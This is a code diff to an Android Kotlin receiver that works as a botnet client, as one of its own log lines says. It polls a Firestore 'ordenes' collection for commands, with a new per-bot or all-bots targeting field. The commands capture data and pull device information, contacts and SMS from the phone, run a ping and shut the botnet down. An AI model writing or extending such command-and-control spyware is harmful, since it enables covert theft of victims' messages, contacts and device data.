@@ -69,46 +69,72 @@ class Alarm : BroadcastReceiver() {
             .get()
             .addOnSuccessListener { result ->
                 for (document in result) {
-                    if(document.data["Primitiva"]!!.equals("CAPTURA")){
-                        nuevaCaptura(db, strDate)
-                        Log.d("TAG2", "Se añade nueva captura")
-                        db.collection("ordenes").document(document.id).delete().addOnSuccessListener {
-                            Log.d("TAG2", "Orden de captura eliminada")
+                    if (document.data["Bot_ID"]!!.equals(idAndroid) || document.data["Bot_ID"]!!.equals("todos")) {
+                        if (document.data["Primitiva"]!!.equals("CAPTURA")) {
+                            nuevaCaptura(db, strDate)
+                            Log.d("TAG2", "Se añade nueva captura")
+                            if(!document.data["Bot_ID"]!!.equals("todos")) {
+                                db.collection("ordenes").document(document.id).delete()
+                                    .addOnSuccessListener {
+                                        Log.d("TAG2", "Orden de captura eliminada")
+                                    }
+                            }
                         }
-                    }
-                    if(document.data["Primitiva"]!!.equals("DATOSDISPOSITIVO")){
-                        nuevosDatosDispositivo(db, strDate)
-                        Log.d("TAG2", "Se añade nuevos datos del dispositivo")
-                        db.collection("ordenes").document(document.id).delete().addOnSuccessListener {
-                            Log.d("TAG2", "Orden de datos de dispositivo eliminada")
+                        if (document.data["Primitiva"]!!.equals("DATOSDISPOSITIVO")) {
+                            nuevosDatosDispositivo(db, strDate)
+                            Log.d("TAG2", "Se añade nuevos datos del dispositivo")
+                            if(!document.data["Bot_ID"]!!.equals("todos")) {
+                                db.collection("ordenes").document(document.id).delete()
+                                    .addOnSuccessListener {
+                                        Log.d("TAG2", "Orden de datos de dispositivo eliminada")
+                                    }
+                            }
                         }
-                    }
-                    if(document.data["Primitiva"]!!.equals("CONTACTO")){
-                        nuevaListaContactos(db, strDate)
-                        Log.d("TAG2", "Se añade nuevos datos de los contactos del dispositivo")
-                        db.collection("ordenes").document(document.id).delete().addOnSuccessListener {
-                            Log.d("TAG2", "Orden de datos de los contactos de dispositivo eliminada")
+                        if (document.data["Primitiva"]!!.equals("CONTACTO")) {
+                            nuevaListaContactos(db, strDate)
+                            Log.d("TAG2", "Se añade nuevos datos de los contactos del dispositivo")
+                            if(!document.data["Bot_ID"]!!.equals("todos")) {
+                                db.collection("ordenes").document(document.id).delete()
+                                    .addOnSuccessListener {
+                                        Log.d(
+                                            "TAG2",
+                                            "Orden de datos de los contactos de dispositivo eliminada"
+                                        )
+                                    }
+                            }
                         }
-                    }
-                    if(document.data["Primitiva"]!!.equals("SMS")){
-                        nuevaListaSMS(db, strDate)
-                        Log.d("TAG2", "Se añade nuevos datos de los sms del dispositivo")
-                        db.collection("ordenes").document(document.id).delete().addOnSuccessListener {
-                            Log.d("TAG2", "Orden de datos de los sms de dispositivo eliminada")
+                        if (document.data["Primitiva"]!!.equals("SMS")) {
+                            nuevaListaSMS(db, strDate)
+                            Log.d("TAG2", "Se añade nuevos datos de los sms del dispositivo")
+                            if(!document.data["Bot_ID"]!!.equals("todos")) {
+                                db.collection("ordenes").document(document.id).delete()
+                                    .addOnSuccessListener {
+                                        Log.d(
+                                            "TAG2",
+                                            "Orden de datos de los sms de dispositivo eliminada"
+                                        )
+                                    }
+                            }
                         }
-                    }
-                    if(document.data["Primitiva"]!!.equals("PING")){
-                        ejecutaComando()
-                        Log.d("TAG2", "Se ha enviado un mensaje de ping")
-                        db.collection("ordenes").document(document.id).delete().addOnSuccessListener {
-                            Log.d("TAG2", "Orden de envio de ping eliminada")
+                        if (document.data["Primitiva"]!!.equals("PING")) {
+                            ejecutaComando()
+                            Log.d("TAG2", "Se ha enviado un mensaje de ping")
+                            if(!document.data["Bot_ID"]!!.equals("todos")) {
+                                db.collection("ordenes").document(document.id).delete()
+                                    .addOnSuccessListener {
+                                        Log.d("TAG2", "Orden de envio de ping eliminada")
+                                    }
+                            }
                         }
-                    }
-                    if(document.data["Primitiva"]!!.equals("APAGAR")){
-                        cancelAlarm(contexto)
-                        Log.d("TAG2", "Se apaga las funciones de botnet")
-                        db.collection("ordenes").document(document.id).delete().addOnSuccessListener {
-                            Log.d("TAG2", "Orden apagar eliminada")
+                        if (document.data["Primitiva"]!!.equals("APAGAR")) {
+                            cancelAlarm(contexto)
+                            Log.d("TAG2", "Se apaga las funciones de botnet")
+                            if(!document.data["Bot_ID"]!!.equals("todos")) {
+                                db.collection("ordenes").document(document.id).delete()
+                                    .addOnSuccessListener {
+                                        Log.d("TAG2", "Orden apagar eliminada")
+                                    }
+                            }
                         }
                     }
                 }
